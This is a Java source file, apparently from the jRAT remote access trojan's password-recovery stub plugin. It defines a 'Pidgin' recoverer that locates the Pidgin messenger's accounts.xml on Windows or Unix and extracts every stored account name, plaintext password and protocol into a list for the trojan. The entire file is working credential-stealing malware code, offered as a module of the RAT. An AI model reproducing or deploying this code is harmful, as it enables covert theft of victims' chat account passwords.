package jrat.plugin.recovery.stub.programs;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;

import jrat.plugin.recovery.stub.Utils;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

import com.redpois0n.oslib.OperatingSystem;

public class Pidgin extends AbstractRecoverer {

	@Override
	public List<String[]> recover() throws Exception {
		List<String[]> list = new ArrayList<String[]>();

		File file = null;
		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
			file = new File(System.getenv("APPDATA") + "\\.purple\\accounts.xml");
		} else {
			file = new File(System.getProperty("user.home") + "/.purple/accounts.xml");
		}

		if (file != null && file.exists()) {
			DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
			DocumentBuilder db = dbf.newDocumentBuilder();
			Document doc = db.parse(file);
			doc.getDocumentElement().normalize();

			NodeList nList = doc.getElementsByTagName("account");
			for (int temp = 0; temp < nList.getLength(); temp++) {
				Node n = nList.item(temp);
				if (n.getNodeType() == Node.ELEMENT_NODE) {
					Element e = (Element) n;

					String username = Utils.getTagValue("name", e);
					String password = Utils.getTagValue("password", e);
					String protocol = Utils.getTagValue("protocol", e);
					
					list.add(new String[] { username, password, protocol });
				}
			}
		}

		return list;
	}

	
	@Override
	public String getName() {
		return "Pidgin";
	}

}
